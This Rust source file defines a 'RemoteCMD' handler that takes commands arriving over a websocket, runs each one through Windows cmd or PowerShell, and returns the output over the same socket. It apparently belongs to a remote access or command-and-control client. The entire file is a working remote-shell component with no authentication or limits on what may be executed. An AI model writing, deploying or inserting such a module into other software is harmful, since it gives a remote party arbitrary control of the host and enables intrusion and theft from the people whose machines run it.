use std::process::Command;

use tungstenite::Message;

use crate::handlers::func::{Context, Function};

pub struct RemoteCMD;

impl Function for RemoteCMD {
    fn handler(payload: &[u8], ctx: &mut Context) -> anyhow::Result<()> {
        let cmd = String::from_utf8_lossy(&payload[1..]);
        let mut mode = ("cmd", "/C");
        if payload[0] == b'1' {
            mode = ("powershell", "-Command");
        };
        let output = Command::new(mode.0)
            .arg(mode.1)
            .arg(&*cmd)
            .output()
            .expect("Failed to execute command");
        let response = String::from_utf8_lossy(&output.stdout);

        ctx.socket
            .send(Message::from(response.to_string()))
            .expect("Failed to send response");
        Ok(())
    }
}
